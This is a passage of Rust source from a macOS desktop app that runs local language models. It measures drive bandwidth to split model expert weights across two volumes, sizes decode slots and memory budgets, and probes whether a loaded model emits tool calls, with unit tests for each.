        b.copy_from_slice(&x.to_le_bytes());
    }
    let mut written = 0u64;
    while written < size {
        f.write_all(&block).map_err(|e| e.to_string())?;
        written += block.len() as u64;
    }
    f.sync_all().map_err(|e| e.to_string())?;
    Ok(())
}

/// Timed sequential read of ~1.5 GB in 8 MiB blocks with the cache bypassed.
/// On files much bigger than the read, the start offset varies run to run.
fn read_bandwidth(path: &Path) -> Result<f64, String> {
    use std::io::{Read, Seek, SeekFrom};
    let mut f = std::fs::File::open(path).map_err(|e| e.to_string())?;
    #[cfg(target_os = "macos")]
    set_nocache(&f);
    let len = f.metadata().map_err(|e| e.to_string())?.len();
    let target: u64 = 1_500_000_000.min(len);
    if len > target + BW_CHUNK as u64 {
        let slots = (len - target) / BW_CHUNK as u64 + 1;
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .subsec_nanos() as u64;
        f.seek(SeekFrom::Start((nanos % slots) * BW_CHUNK as u64))
            .map_err(|e| e.to_string())?;
    }
    let mut buf = vec![0u8; BW_CHUNK];
    let mut total: u64 = 0;
    let t0 = Instant::now();
    while total < target {
        let n = f.read(&mut buf).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        total += n as u64;
    }
    let secs = t0.elapsed().as_secs_f64();
    if total < 200_000_000 || secs <= 0.0 {
        return Err("probe read too small to be meaningful".into());
    }
    Ok(total as f64 / 1e9 / secs)
}

/// Read bandwidth in the shape the ENGINE reads: record-sized requests at
/// random offsets, several in flight, cache bypassed.
///
/// WHY THIS EXISTS ALONGSIDE read_bandwidth
///
/// read_bandwidth is one thread walking a file forwards in 8 MiB blocks. That
/// is the right number to show a user, and the right one for the "is this pair
/// worth splitting at all" guard, but it is NOT the number the split ratio
/// needs, because it is not how expert records are read.
///
/// Measured here on this machine's two SSDs, cold, same files, same instant:
/// sequentially 10.2 and 4.7 GB/s, which puts r* at 0.684; at the engine's
/// shape 14.4 and 4.6 GB/s, which puts it at 0.757. Sweeping the real split
/// found the throughput peak at 0.75. The sequential figures therefore name a
/// ratio that is 13% SLOWER than the constant it was meant to replace, and the
/// queued figures name the optimum. The internal NVMe is the one that gains
/// from depth, so measuring it single-threaded understates it and hands the
/// slow volume more of every record than it can carry.
fn read_bandwidth_queued(path: &Path, chunk: usize, inflight: usize) -> Result<f64, String> {
    use std::os::unix::fs::FileExt;
    use std::sync::atomic::{AtomicU64, Ordering as O};

    let f = std::fs::File::open(path).map_err(|e| e.to_string())?;
    #[cfg(target_os = "macos")]
    set_nocache(&f);
    let len = f.metadata().map_err(|e| e.to_string())?.len();
    if len < chunk as u64 * 2 {
        return Err("probe file too small for a queued read".into());
    }
    // Enough offsets that no two workers replay the same extent, and few
    // enough that the run stays short.
    let slots = (len - chunk as u64) / RECORD_ALIGN + 1;
    let target_per_worker = (BW_QUEUED_TARGET / inflight as u64).max(chunk as u64);
    let f = std::sync::Arc::new(f);
    let total = std::sync::Arc::new(AtomicU64::new(0));
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as u64;

    let t0 = Instant::now();
    let mut handles = Vec::new();
    for w in 0..inflight {
        let f = f.clone();
        let total = total.clone();
        handles.push(std::thread::spawn(move || -> Result<(), String> {
            let mut buf = vec![0u8; chunk];
            // xorshift: a per-worker offset stream, no shared state, no crate.
            let mut x = seed
                .wrapping_mul(0x9e37_79b9_7f4a_7c15)
                .wrapping_add(w as u64 + 1)
                | 1;
            let mut done: u64 = 0;
            while done < target_per_worker {
                x ^= x << 13;
                x ^= x >> 7;
                x ^= x << 17;
                let offset = (x % slots) * RECORD_ALIGN;
                f.read_exact_at(&mut buf, offset).map_err(|e| e.to_string())?;
                done += chunk as u64;
                total.fetch_add(chunk as u64, O::Relaxed);
            }
            Ok(())
        }));
    }
    for h in handles {
        h.join().map_err(|_| "queued probe worker panicked".to_string())??;
    }
    let secs = t0.elapsed().as_secs_f64();
    let read = total.load(O::Relaxed);
    if read < 200_000_000 || secs <= 0.0 {
        return Err("queued probe read too small to be meaningful".into());
    }
    Ok(read as f64 / 1e9 / secs)
}

/// Run `probe` against a big file on the volume at `base`: a real one when the
/// volume already holds one, otherwise a temporary incompressible file that is
/// written, read back cache-cold, and deleted.
fn on_a_big_file<T>(base: &Path, probe: impl Fn(&Path) -> Result<T, String>) -> Result<T, String> {
    if !base.is_dir() {
        return Err(format!("not a directory: {}", base.display()));
    }
    match find_big_file(base, BW_MIN_FILE) {
        Some(p) => probe(&p),
        None => {
            let p = base.join(".galactus-bw-probe.bin");
            let written = write_probe_file(&p, BW_MIN_FILE);
            let result = written.and_then(|_| probe(&p));
            let _ = std::fs::remove_file(&p);
            result
        }
    }
}

/// Sequential read bandwidth of the volume at `path`, in GB/s. This is the
/// number the user is shown and the one the dual/mono guard judges.
fn measure_volume(base: &Path) -> Result<f64, String> {
    on_a_big_file(base, read_bandwidth)
}

/// Bandwidth of the volume at `path` in the engine's own access shape, in
/// GB/s. This is the number the split ratio is computed from.
fn measure_volume_queued(base: &Path) -> Result<f64, String> {
    on_a_big_file(base, |p| read_bandwidth_queued(p, BW_RECORD_CHUNK, BW_INFLIGHT))
}

#[tauri::command]
async fn volume_bandwidth(path: String) -> Result<f64, String> {
    measure_volume(Path::new(&path))
}

/// Everything the app chose for one model on this Mac, and what it chose it
/// from.
///
/// A turnkey product still has to say what it decided. Silent magic that gets
/// it wrong is worse than a visible choice, so every field here is either
/// shown to the user or feeds the sentence that is.
#[derive(Serialize, Clone, Debug)]
struct Recommendation {
    model_id: String,
    /// eco, balanced or perf: the mode a start would really run in, after the
    /// step-down.
    mode: String,
    /// The mode the settings asked for. Different from `mode` when this Mac
    /// cannot afford it right now.
    requested_mode: String,
    /// Conversations that may generate at once.
    slots: u32,
    /// True when `slots` came from an explicit setting rather than from the
    /// machine. The UI says "your choice" instead of "recommended".
    slots_chosen_by_user: bool,
    /// The download variant, when the entry declares any. `None` means the
    /// entry's single `download` block, which is every entry today.
    variant: Option<String>,
    /// Where the pack should go. `None` when the model is already installed
    /// and the question no longer applies.
    layout: Option<PackLayout>,
    /// What the engine would hold in total, bytes.
    resident_bytes: u64,
    /// What this Mac can give right now, bytes.
    budget_bytes: u64,
    /// The physical micro-batch the planner guarded.
    ubatch: u32,
    /// Set when nothing this app can arrange will start this model right now,
    /// carrying the planner's own sentence with its numbers.
    blocked: Option<String>,
}

/// Decide everything for one model, without starting anything.
///
/// Async: it reads vm_stat and two pmset calls, and measures nothing. It must
/// not run on the main thread.
///
/// `volumes` are the measured drives, `[{ mount, free_bytes, bandwidth_gbs }]`,
/// from the install dialog once it has probed. Absent means the model is
/// already installed or the caller does not care where the pack would go, and
/// `layout` then comes back `None` rather than as a guess over drives nobody
/// measured.
#[tauri::command]
async fn recommend_for_model(
    model_id: String,
    volumes: Option<Vec<Value>>,
) -> Result<Recommendation, String> {
    let root = galactus_root()?;
    let entry = registry_entry(&root, &model_id)?;
    let settings = settings_load();
    let ram_mode = settings
        .get("ram_mode")
        .map(String::as_str)
        .filter(|s| matches!(*s, "eco" | "balanced" | "perf"))
        .unwrap_or("balanced")
        .to_string();
    let cpu_moe = entry["cpu_moe"].as_bool().unwrap_or(false)
        || settings.get("cpu_moe").map(|v| v == "1").unwrap_or(false);
    let ram_gb = hardware::static_profile().ram_bytes >> 30;
    let machine = MachineLimits::probe(ram_gb.max(8));
    let chosen = settings.get("engine_slots").and_then(|s| s.trim().parse::<u32>().ok());
    let slots = match chosen {
        Some(n) => n.clamp(1, MAX_SLOTS),
        None => recommended_slots(&entry, machine, &ram_mode, cpu_moe),
    };

    let layout = volumes.map(|list| {
        let pack_bytes = entry["expert_bytes_total"]
            .as_u64()
            .or_else(|| entry["gguf_bytes"].as_u64())
            .unwrap_or(0);
        let parsed: Vec<PackVolume> = list
            .iter()
            .filter_map(|v| {
                Some(PackVolume {
                    mount: v["mount"].as_str()?.to_string(),
                    free_bytes: v["free_bytes"].as_u64()?,
                    bandwidth_gbs: v["bandwidth_gbs"].as_f64(),
                })
            })
            .collect();
        recommend_layout(&parsed, pack_bytes)
    });

    let base = Recommendation {
        model_id: model_id.clone(),
        mode: ram_mode.clone(),
        requested_mode: ram_mode.clone(),
        slots,
        slots_chosen_by_user: chosen.is_some(),
        variant: recommend_variant(&entry, ram_gb),
        layout,
        resident_bytes: 0,
        budget_bytes: engine_budget_bytes(ram_gb * 1_000_000_000, machine),
        ubatch: 0,
        blocked: None,
    };
    // The planner is the authority on mode and micro-batch, and it is also the
    // only thing that knows how to say no with a number in the sentence. A
    // refusal is REPORTED, not turned into an error: the card still has to
    // render, and the user still has to be told what would have to change.
    Ok(match plan_cache(&entry, machine, None, &ram_mode, cpu_moe, slots) {
        Ok(plan) => Recommendation {
            mode: plan.decision.mode,
            requested_mode: plan.decision.requested,
            resident_bytes: plan.decision.resident_bytes,
            budget_bytes: plan.decision.budget_bytes,
            ubatch: plan.ubatch,
            ..base
        },
        Err(why) => Recommendation { blocked: Some(why), ..base },
    })
}

// ------------------------------------------------------- dual split ratio
//
// Both volumes are read in parallel, so a record is ready when the SLOWER side
// finishes: the time is max(r/Bi, (1-r)/Be) and the optimum is the r where the
// two finish together, r* = Bi / (Bi + Be). Any other r pays the difference on
// every single record for the life of the install, which is why this number is
// measured rather than compiled in.
//
// These three constants MUST stay identical to src/h4/h4-core.hpp
// (p0v2_default_ratio, p0_ratio_minimum, p0_ratio_maximum) and to
// scripts/galactus-pack-plan.py: the planner writes what this computes and the
// engine validates what the planner wrote.
/// The historical P0v2 cut. Fallback for a failed or degenerate measurement,
/// and the ratio every pack written before this was a runtime value used.
const PACK_RATIO_DEFAULT: f64 = 0.7157;
/// Usable bounds. Outside them one volume carries so little of each record
/// that the read it still costs is pure overhead.
const PACK_RATIO_MIN: f64 = 0.05;
const PACK_RATIO_MAX: f64 = 0.95;
/// Fractional digits the ratio is quantised to. Finer than the probe's own
/// noise, and short enough that the decimal spelling is exact everywhere it is
/// parsed: Python float() and C strtod are both correctly rounded, so the
/// packer and the engine recover the SAME double from this string and their
/// round(blocks * ratio) cannot drift apart.
const PACK_RATIO_DECIMALS: usize = 4;

/// r* = Bi / (Bi + Be), quantised and clamped. A measurement that failed
/// (zero, negative, NaN, infinite) or a degenerate result falls back to
/// PACK_RATIO_DEFAULT: a bad ratio must never produce a pack nothing can read.
fn pack_split_ratio(internal_bw: f64, external_bw: f64) -> f64 {
    if !internal_bw.is_finite() || !external_bw.is_finite() || internal_bw <= 0.0 || external_bw <= 0.0
    {
        return PACK_RATIO_DEFAULT;
    }
    let sum = internal_bw + external_bw;
    if !sum.is_finite() || sum <= 0.0 {
        return PACK_RATIO_DEFAULT;
    }
    let scale = 10f64.powi(PACK_RATIO_DECIMALS as i32);
    let r = (internal_bw / sum * scale).round() / scale;
    if !r.is_finite() || !(PACK_RATIO_MIN..=PACK_RATIO_MAX).contains(&r) {
        return PACK_RATIO_DEFAULT;
    }
    r
}

/// The one spelling of a ratio that ever reaches a file or an environment
/// variable. Fixed decimals, so the planner and the engine parse the same
/// characters.
fn pack_ratio_text(ratio: f64) -> String {
    format!("{ratio:.*}", PACK_RATIO_DECIMALS)
}

#[cfg(test)]
mod pack_ratio_tests {
    use super::*;

    #[test]
    fn optimum_puts_the_bigger_share_on_the_faster_volume() {
        // Two identical NVMe drives: half each, which is where the compiled
        // 0.7157 cost the most.
        assert_eq!(pack_split_ratio(6.0, 6.0), 0.5);
        // The pair the frozen constant was measured on: Bi/Be = 2.52.
        assert_eq!(pack_split_ratio(2.52, 1.0), 0.7159);
        // Fast internal, slow external, and the reverse.
        assert_eq!(pack_split_ratio(6.0, 1.0), 0.8571);
        assert_eq!(pack_split_ratio(1.0, 6.0), 0.1429);
    }

    #[test]
    fn a_failed_measurement_falls_back_to_the_historical_cut() {
        assert_eq!(pack_split_ratio(0.0, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(6.0, 0.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(-1.0, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(f64::NAN, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(f64::INFINITY, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(6.0, f64::NAN), PACK_RATIO_DEFAULT);
    }

    #[test]
    fn a_ratio_outside_the_bounds_falls_back_instead_of_being_clamped() {
        // 100:1 is not a pair of SSDs, it is a broken probe. Clamping to 0.95
        // would write a pack from a measurement nobody should trust.
        assert_eq!(pack_split_ratio(100.0, 1.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(1.0, 100.0), PACK_RATIO_DEFAULT);
        // The edges themselves are usable.
        assert_eq!(pack_split_ratio(19.0, 1.0), PACK_RATIO_MAX);
        assert_eq!(pack_split_ratio(1.0, 19.0), PACK_RATIO_MIN);
    }

    #[test]
    fn the_text_form_is_the_grid_the_engine_parses() {
        assert_eq!(pack_ratio_text(0.5), "0.5000");
        assert_eq!(pack_ratio_text(PACK_RATIO_DEFAULT), "0.7157");
        assert_eq!(pack_ratio_text(pack_split_ratio(6.0, 1.0)), "0.8571");
    }
}

/// Probe base for a pack destination dir: nearest existing ancestor, then the
/// mount root (the system data volume probes through $HOME).
fn probe_base_for(dir: &Path) -> PathBuf {
    let mut p = dir.to_path_buf();
    while !p.exists() && p.pop() {}
    if let Some((_, _, _, mount)) = df_line(&p.to_string_lossy()) {
        if mount == "/" || mount == "/System/Volumes/Data" {
            return PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| "/".into()));
        }
        return PathBuf::from(mount);
    }
    p
}

// ---------------------------------------------------------------- server

struct ServerState {
    child: Option<Child>,
    model_id: Option<String>,
    phase: String, // stopped | starting | ready | failed
    generation: u64,
    /// Port actually bound by the running server (0 when stopped).
    port: u16,
    /// Engine regime: resident-metal | streamed-metal | cpu-bit-exact.
    mode: String,
    /// Decode slots the running server was started with (--parallel).
    slots: u32,
    /// Measured tool-calling verdict for the running model (see ServerStatus).
    tools_ok: Option<bool>,
    /// The footprint mode this server was actually started in, and why. None
    /// while stopped.
    footprint: Option<ModeDecision>,
}

static SERVER: OnceLock<Mutex<ServerState>> = OnceLock::new();
static SERVER_GEN: AtomicU64 = AtomicU64::new(0);

fn server_state() -> &'static Mutex<ServerState> {
    SERVER.get_or_init(|| {
        Mutex::new(ServerState {
            child: None,
            model_id: None,
            phase: "stopped".into(),
            generation: 0,
            port: 0,
            mode: String::new(),
            slots: 1,
            tools_ok: None,
            footprint: None,
        })
    })
}

// ---------------------------------------------------------------- decode slots
//
// llama-server splits --ctx-size across --parallel slots, so N slots at the
// same per-conversation window cost N times the KV cache and nothing else:
// measured on Qwen3-30B-A3B Q8_0 (resident-bit-exact, M5 Max 128 GB), the
// resident footprint goes 29.6 GB at 1 slot / 8192, 30.4 GB at 2 slots /
// 16384, 32.0 GB at 4 slots / 32768: about 0.8 GB per extra slot, with
// single-stream generation unchanged. That is what makes several
// conversations able to generate at once, and it is why the window per slot
// is held at CTX_PER_SLOT instead of being divided.
//
// The app never runs more concurrent turns than there are slots (see the slot
// pool in main.ts): the bound is this number, not a UI convention.

/// Context window every slot must keep, whatever the slot count.
const CTX_PER_SLOT: u32 = 8192;

/// How the engine is told to parse a chat turn, in one place.
///
/// `--jinja` has always been here. `--reasoning-format deepseek` is the flag
/// that lets the app show a model thinking, and the three values are NOT
/// interchangeable:
///
///   none             leaves the thoughts unparsed inside `message.content`,
///                    so the answer arrives with raw `<think>` tags in it.
///   deepseek-legacy  extracts them AND re-inlines them into the content while
///                    streaming (server-schema.cpp sets `reasoning_in_content`
///                    for exactly this value), so the tags come back on screen.
///   deepseek         puts them in `message.reasoning_content`, including in
///                    every streaming delta, and leaves `content` holding the
///                    answer alone. The only one of the three that lets the
///                    two be shown differently.
///
/// It is passed EXPLICITLY even though this build already defaults to it
/// (`common_params::reasoning_format` in common/common.h). The flag's own help
/// text in common/arg.cpp announces a different default, "auto", so the
/// default is a thing two parts of llama.cpp disagree about, and a vendored
/// dependency is bumped by whoever is bumping it. Stating the value costs two
/// arguments and removes the app's most visible behaviour from that argument.
fn chat_parsing_args() -> [&'static str; 3] {
    ["--jinja", "--reasoning-format", "deepseek"]
}
/// Hard ceiling on slots: past this the KV cache stops being free and a Mac
/// with a big model would pay it in evictions.
const MAX_SLOTS: u32 = 4;
/// Resident cost of one decode slot beyond the first, from the measurements
/// above: 29.6 GB at one slot, 30.4 at two, 32.0 at four. The planner has to
/// pay it, or a two-slot default silently spends 0.8 GB it never budgeted.
const KV_BYTES_PER_EXTRA_SLOT: u64 = 800_000_000;

/// Decode slots to start the engine with (setting "engine_slots", default 2).
///
/// Two is the honest default: it makes a second conversation possible for
/// 0.8 GB, while four costs 2.4 GB for a fan-out the aggregate throughput
/// does not reward on this engine.
fn engine_slots() -> u32 {
    settings_load()
        .get("engine_slots")
        .and_then(|s| s.trim().parse::<u32>().ok())
        .unwrap_or(2)
        .clamp(1, MAX_SLOTS)
}

/// The slot count a start will really use: what the user chose, or what this
/// model on this Mac can afford.
///
/// The flat default of two was the turnkey promise failing quietly. It is the
/// right answer on most Macs and it is 0.8 GB of KV cache taken out of the
/// arena on the Macs that had nothing to give, which is where the modes were
/// stepping down to pay for a second conversation the user had not opened.
///
/// An explicit setting always wins: this replaces a default, not a choice.
fn resolved_slots(entry: &Value, machine: MachineLimits, ram_mode: &str, cpu_moe: bool) -> u32 {
    match settings_load().get("engine_slots").and_then(|s| s.trim().parse::<u32>().ok()) {
        Some(chosen) => chosen.clamp(1, MAX_SLOTS),
        None => recommended_slots(entry, machine, ram_mode, cpu_moe),
    }
}

#[derive(Serialize, Clone)]
struct ServerStatus {
    running: bool,
    model_id: Option<String>,
    port: u16,
    phase: String,
    mode: String,
    /// Concurrent decode streams the running engine can serve.
    slots: u32,
    /// Whether this model actually emits tool calls, MEASURED at warmup.
    ///
    /// None while unknown (server starting, or the probe has not answered).
    /// A model that cannot call tools cannot drive the agent loop at all: it
    /// reads no file and runs no command, and every agent surface silently
    /// does nothing. The app disables those surfaces instead, which is only
    /// possible if it knows. Declaring the capability in the registry would
    /// have been cheaper and would have been wrong: it depends on the build,
    /// the chat template and the quantization, not on the model name.
    tools_ok: Option<bool>,
    /// The memory-footprint decision this engine was started with: the mode
    /// asked for, the mode actually used, and the two numbers that separate
    /// them. The UI says so out loud when they differ, because a user who
    /// picked Performance and silently got Eco would rightly call that a bug.
    footprint: Option<ModeDecision>,
}

#[tauri::command]
fn server_status() -> ServerStatus {
    let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
    ServerStatus {
        running: s.child.is_some(),
        model_id: s.model_id.clone(),
        port: if s.port == 0 { SERVER_PORT_BASE } else { s.port },
        phase: s.phase.clone(),
        mode: s.mode.clone(),
        // Stopped: report what the NEXT start would give, so the UI never
        // promises a concurrency the engine will not have.
        slots: if s.child.is_some() { s.slots } else { engine_slots() },
        tools_ok: s.tools_ok,
        footprint: s.footprint.clone(),
    }
}

/// Ask the running model to call a trivial tool, and report whether it did.
///
/// This measures the one thing the agent loop cannot work without. It is a
/// capability of the running combination, not of the model name: the same
/// weights answer differently depending on the chat template baked into the
/// GGUF, on whether the server was started with --jinja, and on the
/// quantization. Declaring it in the registry would therefore have been a
/// guess dressed up as a fact.
///
/// `tool_choice` is left on auto ON PURPOSE. Forcing it would measure whether
/// the engine can constrain the grammar, which it always can; what the agent
/// loop needs is whether the model reaches for a tool on its own when the
/// question plainly calls for one. A model that answers in prose here will
/// answer in prose when asked to read a file.
fn probe_tool_calling(port: u16) -> Option<bool> {
    // Two budgets. The first is what an ordinary model needs; the second is for
    // one that thinks at length before it acts, and is only ever paid when the
    // first answer was cut off mid-sentence.
    for cap in PROBE_TOKEN_BUDGETS {
        let body = probe_body(cap);
        let out = Command::new("curl")
            .args(["-s", "--max-time", "180", "-H", "Content-Type: application/json", "-d", &body])
            .arg(format!("http://127.0.0.1:{port}/v1/chat/completions"))
            .output()
            .ok()?;
        match read_tool_verdict(&String::from_utf8_lossy(&out.stdout)) {
            Some(v) => return Some(v),
            // None means the answer was truncated, so it says nothing about the
            // model. Buy more room and ask again.
            None => continue,
        }
    }
    None
}

/// Token budgets for the capability probe, tried in order.
///
/// It was ONE budget of 64, and that number is where this bug lived. A reasoning
/// model spends its opening tokens thinking, so it was cut off long before it
/// reached the tool call, answered with no `tool_calls`, and was recorded as
/// incapable. Qwen3.6 and Mellum2 are both thinking models, and both had the
/// Code and Runs tabs locked against them by a measurement of nothing but the
/// budget. 64 tokens does not measure whether a model can call a tool; it
/// measures whether it can do so while barely being allowed to speak.
const PROBE_TOKEN_BUDGETS: [u32; 2] = [512, 4096];

/// The probe request, at a given token budget.
///
/// `enable_thinking:false` is passed through `chat_template_kwargs`, which the
/// Qwen family honours and every other template ignores: a model that can be
/// asked to skip its reasoning for one question answers this one in a few
/// tokens. It is a shortcut, not the fix, which is why the budgets above are
/// sized to work even when it is ignored.
fn probe_body(max_tokens: u32) -> String {
    format!(
        r#"{{
      "model":"galactus-local",
      "messages":[{{"role":"user","content":"What time is it right now? Use the tool."}}],
      "tools":[{{"type":"function","function":{{
        "name":"get_current_time",
        "description":"Return the current time. Call this whenever the user asks what time it is.",
        "parameters":{{"type":"object","properties":{{}},"required":[]}}}}}}],
      "tool_choice":"auto","max_tokens":{max_tokens},"stream":false,"temperature":0,
      "chat_template_kwargs":{{"enable_thinking":false}}
    }}"#
    )
}

/// Read the verdict out of one chat-completions answer.
///
/// Split out of the probe so the part that can actually be wrong is testable
/// without a 32 GB model: the transport is curl, which either answers or does
/// not, while THIS is where a build that emits an empty `tool_calls` array
/// beside a prose reply would be misread as capable.
///
/// Returns None only when the body is not JSON at all, which means the probe
/// itself failed and the question stays open. Every parseable answer yields a
/// definite yes or no.
fn read_tool_verdict(body: &str) -> Option<bool> {
    let v: serde_json::Value = serde_json::from_str(body).ok()?;
    // A server whose chat template carries no tool support answers with an
    // error rather than a choice. That is a definite no, not an unknown.
    if v.get("error").is_some() {
        return Some(false);
    }
    let calls = v
        .get("choices")
        .and_then(|c| c.get(0))
        .and_then(|c| c.get("message"))
        .and_then(|m| m.get("tool_calls"))
        .and_then(|t| t.as_array());
    let named = |a: &Vec<serde_json::Value>| {
        a.iter().any(|c| {
            c.pointer("/function/name").and_then(|n| n.as_str()).is_some_and(|n| !n.is_empty())
        })
    };
    if let Some(a) = calls {
        if named(a) {
            return Some(true);
        }
    }
    // No call. Before calling that a no, ask whether the model was allowed to
    // finish. finish_reason "length" means the budget ran out mid-answer, and an
    // answer that was cut off is evidence about the budget, not about the model:
    // a reasoning model reaches its tool call after its thinking, so a short
    // budget produced a confident, permanent, wrong "cannot call tools" that
    // locked the Code and Runs tabs. Unknown, so the caller can buy more room.
    let truncated = v
        .pointer("/choices/0/finish_reason")
        .and_then(|f| f.as_str())
        .is_some_and(|f| f == "length");
    if truncated {
        return None;
    }
    Some(false)
}

#[cfg(test)]
mod tool_probe_tests {
    use super::{probe_body, read_tool_verdict, PROBE_TOKEN_BUDGETS};

    #[test]
    fn a_truncated_answer_is_not_a_verdict() {
        // What a thinking model returns when the budget ends inside its
        // reasoning: no call, and finish_reason saying why. Reading this as
        // "cannot call tools" is what locked the Code tab on Qwen3.6.
        let body = r#"{"choices":[{"finish_reason":"length","message":{
            "role":"assistant","content":"","reasoning_content":"The user wants the time, so I should"}}]}"#;
        assert_eq!(read_tool_verdict(body), None, "truncation says nothing about the model");
    }

    #[test]
    fn a_complete_answer_with_no_call_is_a_definite_no() {
        // The distinction the test above depends on: a model that finished its
        // sentence and still did not reach for the tool really cannot be driven.
        let body = r#"{"choices":[{"finish_reason":"stop","message":{
            "role":"assistant","content":"I do not have access to the current time."}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn the_probe_gives_a_reasoning_model_room_to_reach_its_tool_call() {
        // 64 was the shipped value and it measured the budget, not the model.
        assert!(
            PROBE_TOKEN_BUDGETS[0] >= 256,
            "a thinking model spends its opening tokens thinking",
        );
        assert!(
            PROBE_TOKEN_BUDGETS[1] > PROBE_TOKEN_BUDGETS[0],
            "the retry must buy more room than the first attempt",
        );
        for cap in PROBE_TOKEN_BUDGETS {
            let body = probe_body(cap);
            assert!(body.contains(&format!("\"max_tokens\":{cap}")));
            // Auto on purpose: forcing the call would measure the grammar
            // engine, not whether the model reaches for a tool by itself.
            assert!(body.contains("\"tool_choice\":\"auto\""));
            assert!(body.contains("\"enable_thinking\":false"));
            assert!(serde_json::from_str::<serde_json::Value>(&body).is_ok(), "probe body is JSON");
        }
    }

    #[test]
    fn a_real_tool_call_reads_as_capable() {
        // Shape captured from the running engine on Qwen3-30B-A3B.
        let body = r#"{"choices":[{"message":{"role":"assistant","content":"","tool_calls":[
            {"type":"function","function":{"name":"get_current_time","arguments":"{}"},"id":"ai28"}]}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(true));
    }

    #[test]
    fn a_prose_answer_reads_as_incapable() {
        let body = r#"{"choices":[{"message":{"role":"assistant","content":"It is about noon."}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn an_empty_array_is_not_a_tool_call() {
        // The trap: a build that always emits the key, empty, beside prose.
        // Testing for the key's presence would have called this one capable.
        let body = r#"{"choices":[{"message":{"content":"Noon.","tool_calls":[]}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn a_nameless_call_is_not_a_tool_call() {
        let body = r#"{"choices":[{"message":{"tool_calls":[{"type":"function","function":{"arguments":"{}"}}]}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
        let empty = r#"{"choices":[{"message":{"tool_calls":[{"function":{"name":""}}]}}]}"#;
        assert_eq!(read_tool_verdict(empty), Some(false));
    }

    #[test]
    fn a_template_without_tool_support_is_a_definite_no() {
        let body = r#"{"error":{"code":500,"message":"this chat template does not support tools"}}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn a_non_json_answer_leaves_the_question_open() {
        // curl timed out, or the server died mid-probe. Reporting "incapable"
        // here would disable the Code view over a transport failure.
        assert_eq!(read_tool_verdict(""), None);
        assert_eq!(read_tool_verdict("<html>502</html>"), None);
    }
}

/// Cache sizing: RAM minus non-expert weights minus a system margin, capped at
/// 70% of RAM and at full expert residency. The SLRU protected fraction is
/// then chosen as the largest of 0.75/0.50/0.25 whose probation segment can
/// hold one token's distinct experts (micro-batch 1).
/// Routed-expert geometry: (non_expert, expert_total, moe_layers, record, used,
/// experts). Prefers the profile measured from the real GGUF at install time
/// (models/<id>/profile.json), falls back to the registry, refuses to guess.
///
/// The record size used is the LARGEST class: the layer with the biggest
/// records is the binding constraint on the per-layer slot quota, so planning
/// on it is fail-closed.
fn measured_geometry(entry: &Value) -> Option<(u64, u64, u64, u64, u64, u64)> {
    let id = entry["id"].as_str().unwrap_or_default();
    let profile: Option<Value> = galactus_root()
        .ok()
        .map(|r| r.join("models").join(id).join("profile.json"))
        .filter(|p| p.is_file())
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|t| serde_json::from_str(&t).ok());

    if let Some(p) = profile {
        let record = p["layers"]
            .as_array()
            .map(|a| {
                a.iter()
                    .filter_map(|l| l["record_bytes_padded"].as_u64())
                    .max()
                    .unwrap_or(0)
            })
            .unwrap_or(0);
        let non_expert = p["totals"]["non_routed_bytes"].as_u64().unwrap_or(0);
        let expert_total = p["totals"]["routed_bytes_padded_pack"].as_u64().unwrap_or(0);
        let layers = p["moe_layer_count"].as_u64().unwrap_or(0);
        let used = p["expert_used_count"].as_u64().unwrap_or(0);
        let experts = p["expert_count"].as_u64().unwrap_or(0);
        if record > 0 && expert_total > 0 && layers > 0 && used > 0 && experts > 0 {
            return Some((non_expert, expert_total, layers, record, used, experts));
        }
    }

    let record = entry["record_bytes"].as_u64()?;
    let expert_total = entry["expert_bytes_total"].as_u64()?;
    let layers = entry["layers_moe"].as_u64()?;
    let used = entry["experts_used"].as_u64()?;
    let experts = entry["experts"].as_u64()?;
    let non_expert = entry["non_expert_bytes"].as_u64()?;
    if record == 0 || expert_total == 0 || layers == 0 || used == 0 || experts == 0 {
        return None;
    }
    Some((non_expert, expert_total, layers, record, used, experts))
}

/// RAM that Galactus never assigns to weights or the expert cache.
///
/// Two decimal GB is enough on 16/24/32 GB machines where every cache byte
/// matters. Above that, Macs also tend to run a larger working set (IDE,
/// browser, build tools), so the reserve scales to 6.25% of unified memory:
/// 4 GB on a 64 GB Mac and 8 GB on a 128 GB Mac.
///
/// A guess about a machine nobody has measured, and it is only half the
/// answer: see engine_budget_bytes, where the reserve is one of two bounds and
/// the other one reads what the Mac can actually give right now.
fn system_reserve_bytes(ram: u64) -> u64 {
    2_000_000_000u64.max(ram / 16)
}

#[cfg(test)]
mod system_reserve_tests {
    use super::system_reserve_bytes;

    #[test]
    fn reserve_keeps_small_macs_viable_and_scales_on_large_macs() {
        assert_eq!(system_reserve_bytes(16_000_000_000), 2_000_000_000);
        assert_eq!(system_reserve_bytes(32_000_000_000), 2_000_000_000);
        assert_eq!(system_reserve_bytes(64_000_000_000), 4_000_000_000);
        assert_eq!(system_reserve_bytes(128_000_000_000), 8_000_000_000);
    }
}

// ------------------------------------------------ what this Mac can give NOW
//
// Two numbers were being confused with each other, and the confusion is what a
// colleague on a 24 GB Mac read as "Compute error.":
//
//   - the memory the Mac was SOLD with (`sysctl hw.memsize`), minus a fixed
//     reserve. A constant guessed on somebody else's machine.
//   - the memory the Mac can hand over RIGHT NOW (`vm_stat`), which is the
//     only number the allocator answers to.
//
